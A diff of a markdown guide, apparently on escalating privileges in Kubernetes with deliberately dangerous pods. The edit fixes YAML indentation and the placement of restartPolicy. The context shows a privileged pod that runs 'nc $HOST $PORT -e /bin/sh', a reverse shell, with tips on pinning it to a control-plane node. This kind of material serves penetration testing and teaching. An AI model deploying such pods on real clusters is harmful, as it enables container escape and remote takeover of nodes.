@@ -22,7 +22,7 @@ spec:
       - "604800"
     imagePullPolicy: IfNotPresent
     name: hostpid
-    #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  restartPolicy: Always
+  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  restartPolicy: Always
   ```
 [pod-priv.yaml](pod-priv.yaml)
 
@@ -57,7 +57,9 @@ spec:
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
     securityContext:
       privileged: true
-    #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name```
+  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name
+  restartPolicy: Always
+  ```
 [pod-hostpid-revshell.yaml](pod-hostpid-revshell.yaml)
 
 #### Set up listener
